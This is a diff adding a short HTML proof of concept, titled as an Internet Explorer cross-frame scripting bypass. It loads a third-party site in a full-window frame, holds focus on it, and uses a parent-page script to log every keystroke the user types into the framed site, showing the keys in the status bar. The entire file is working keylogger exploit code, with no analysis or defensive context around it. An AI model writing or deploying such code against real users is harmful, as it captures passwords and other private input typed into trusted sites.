@@ -1,0 +1,15 @@
+<html>
+<head>
+  <title>IE Cross Frame Scripting Restriction Bypass Example</title>
+  <script>
+    var keylog='';
+    document.onkeypress = function () {
+      k = window.event.keyCode;
+      window.status = keylog += String.fromCharCode(k) + '[' + k +']';
+    }
+  </script>
+</head>
+<frameset onload="this.focus();" onblur="this.focus();" cols="100%">
+  <frame src="http://www.baidu.com/" scrolling="auto">
+</frameset>
+</html>
